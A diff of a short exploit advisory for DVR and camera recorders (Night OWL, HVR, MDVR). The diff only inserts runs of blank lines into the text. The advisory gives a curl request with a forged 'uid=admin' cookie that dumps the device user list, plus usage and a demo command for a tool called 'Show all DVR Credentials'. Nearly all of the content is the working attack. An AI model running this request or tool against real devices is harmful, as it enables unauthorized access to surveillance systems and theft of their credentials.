@@ -6,6 +6,18 @@
 [*] Date:                09/04/2018
 [*] Exploit Author:      Fernandez Ezequiel ( twitter:@capitan_alfa )
 
+
+
+
+
+
+
+
+
+
+
+
+
 $> Exploit:
 curl "http://<dvr_host>:<port>/device.rsp?opt=user&cmd=list" -H "Cookie: uid=admin"
 	
@@ -20,6 +32,22 @@ Night OWL
 DVR Login
 HVR Login
 MDVR Login
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 TOOL: "Show all DVR Credentials"
 Quick start
@@ -36,5 +64,22 @@ optional arguments:
   -v, --version  show program's version number and exit
   --host HOST    Host
   --port PORT    Port
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 [+] Demo: python Cam.py --host 192.168.1.101 -p 81
